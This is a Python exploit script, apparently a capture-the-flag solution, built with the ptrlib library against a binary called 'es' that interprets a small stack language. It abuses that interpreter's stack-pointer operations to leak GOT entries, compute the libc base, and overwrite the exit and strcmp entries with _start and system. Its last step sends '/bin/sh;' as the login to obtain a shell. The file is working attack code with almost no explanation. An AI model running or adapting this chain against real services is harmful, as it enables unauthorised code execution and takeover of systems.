from ptrlib import *

elf = ELF("./es")

def inc():
    return chr(0x61 + 0)
def dec():
    return chr(0x61 + 18)
def inc_sp():
    return chr(0x61 + 20)
def dec_sp():
    return chr(0x61 + 3)
def getchar():
    return chr(0x61 + 6)
def putchar():
    return chr(0x61 + 15)
def illegal_opecode():
    return chr(0xff)

#sock = Process("./es")
#libc = ELF("./libc-2.27.so")
#sock = Socket("185.66.87.233", 5001)
libc = ELF("/lib/libc.so.6")
sock = Socket("localhost", 5001)

""" Stage 1 """
sp = elf.symbol("stack")
got_setvbuf = elf.got("setvbuf")
got_putchar = elf.got("putchar")
got_exit = elf.got("exit")
addr_start = elf.symbol("_start")

payload = getchar()
payload += dec_sp() * (sp - got_setvbuf)
sp -= sp - got_setvbuf
# leak <setvbuf>
for i in range(4):
    payload += putchar() + inc_sp()
    sp += 1
for i in range(4):
    payload += inc_sp()
    sp += 1
# leak <putchar>
for i in range(4):
    payload += putchar() + inc_sp()
    sp += 1
# overwrite <exit>
payload += dec_sp() * (sp - got_exit)
for i in range(4):
    payload += getchar() + inc_sp()
payload += illegal_opecode()

sock.recvuntil("Login: ")
sock.sendline("admin")
sock.recvuntil("Password: ")
sock.sendline("password")
sock.recvuntil("here: ")
sock.send(payload)

# leak <setvbuf>
addr = sock.recvonce(4)
if addr is None:
    dump("Bad luck!", "warning")
    exit(1)
addr_setvbuf = u64(addr)
dump("<setvbuf> = " + hex(addr_setvbuf))

# leak <putchar>
addr = sock.recvonce(4)
if addr is None:
    dump("Bad luck!", "warning")
    exit(1)
addr_putchar = u64(addr)
dump("<putchar> = " + hex(addr_putchar))

libc_base = addr_putchar - libc.symbol("putchar")
addr_system = libc_base + libc.symbol("system")
dump("libc base = " + hex(libc_base))
dump("<sytem> = " + hex(addr_system))

# overwrite <exit>
sock.send(p32(addr_start))

dump("Stage 1: Done!", "success")

## Stage 2
sp = elf.symbol("stack")
got_strcmp = elf.got("strcmp")
addr_auth = elf.symbol("auth")

payload = ''
payload += dec_sp() * (sp - got_strcmp)
sp -= sp - got_strcmp
# overwrite <strcmp>
for i in range(4):
    payload += getchar() + inc_sp()
    sp += 1
# overwrite <auth>
payload += inc_sp() * (addr_auth - sp)
payload += getchar() * 4
payload += illegal_opecode()

sock.recvuntil("Input your code here: ")
sock.send(payload)

# overwrite <strcmp>
sock.send(p32(addr_system))
# overwrite <auth>
sock.send(p32(0))

dump("Stage 2: Done!", "success")

""" Stage 3 """
sock.recvuntil("Login: ")
sock.sendline("/bin/sh;")
sock.recvuntil("Password: ")
sock.sendline("/bin/sh;")
dump("Stage 3: Done!", "success")

sock.interactive()
